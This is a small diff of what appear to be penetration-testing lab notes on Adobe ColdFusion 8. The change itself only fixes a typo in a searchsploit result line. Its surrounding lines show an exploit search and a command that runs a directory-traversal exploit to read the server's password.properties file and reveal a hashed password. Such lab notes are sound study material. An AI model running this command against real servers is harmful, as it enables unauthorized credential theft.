@@ -6,7 +6,7 @@ Adobe ColdFusion 8
 
 # 3 find exploits
 searchsploit Adobe ColdFusion
-dobe ColdFusion - Directory Traversal  | multiple/remote/14641.py
+Adobe ColdFusion - Directory Traversal  | multiple/remote/14641.py
 
 # 4 reveal hashed password
 python2 14641.py 10.11.1.10 80 ./../../../../../../../../../ColdFusion8/lib/password.properties
